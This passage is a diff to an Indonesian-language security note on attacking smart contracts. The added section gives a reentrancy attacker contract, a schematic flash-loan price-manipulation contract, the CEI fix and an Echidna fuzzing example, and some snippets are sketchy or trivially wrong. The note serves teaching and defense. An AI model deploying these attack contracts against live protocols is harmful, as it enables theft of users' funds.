@@ -16,7 +16,6 @@ cssclasses:
   - wide-table
   - callout
 ---
-
 # Blockchain & Smart Contract — Perspektif Penyerang
 
 > Smart contract = code yang menahan uang — bug = langsung rugi. Red team: reentrancy, flash loan, oracle manipulation, front-running, governance attack, private key theft.
@@ -109,3 +108,77 @@ Mitigation: Chainlink (off-chain) → but:
 - Echidna — https://github.com/crytic/echidna
 - Smart Contract Attack Vectors — https://github.com/Consensys/ethereum-developer-tools-list
 - DeFi Hack Analysis — https://rekt.news/
+
+## Konkret — DeFi Exploit (Testable)
+
+### Reentrancy (Classic)
+
+```solidity
+// Vulnerable pattern: external call sebelum state update
+function withdraw(uint amount) public {
+    require(balances[msg.sender] >= amount);
+    // BUG: call sebelum balance update
+    (bool ok,) = msg.sender.call{value: amount}("");
+    require(ok);
+    balances[msg.sender] -= amount;  // re-entered here
+}
+
+// Attack contract:
+contract Attacker {
+    function attack() external {
+        target.withdraw(target.balance);
+    }
+    receive() external payable {
+        if (address(target).balance > 0) {
+            target.withdraw(target.balance);  // re-enter
+        }
+    }
+}
+
+// Fix: CEI pattern (Check-Effect-Interact)
+// 1. Check balance
+// 2. Update balance (effect)
+// 3. External call (interact) — LAST
+```
+
+### Flash Loan Attack
+
+```solidity
+// 1. Borrow massive amount (no collateral)
+// 2. Manipulate price oracle (pump via swap)
+// 3. Trigger liquidation / arbitrage
+// 4. Repay loan + keep profit
+
+contract FlashAttack {
+    function attack() external {
+        // Borrow 10M USDC (flash)
+        flashloan.borrow(10_000_000e6, this);
+    }
+    function callback(uint amount) external {
+        // Manipulate price: large swap → USDC/Pair price spike
+        uniswapRouter.swap(amount, ...);
+        // Now borrow more (over-collateralized by inflated asset)
+        lending.borrow(50_000 ether);
+        // Dump inflated asset → return flash loan
+        token.approve(flashloan, amount + fee);
+    }
+}
+```
+
+### Fuzzing Smart Contract (Echidna)
+
+```bash
+# 1. Write invariant test
+contract TestContract {
+    function echidna_balance() public view returns (bool) {
+        return address(this).balance >= 0;
+    }
+}
+// 2. Run Echidna
+echidna-test TestContract.sol --contract TestContract --test-limit 10000
+// 3. Output: sequence of transactions yang break invariant
+```
+---
+
+audited
+---
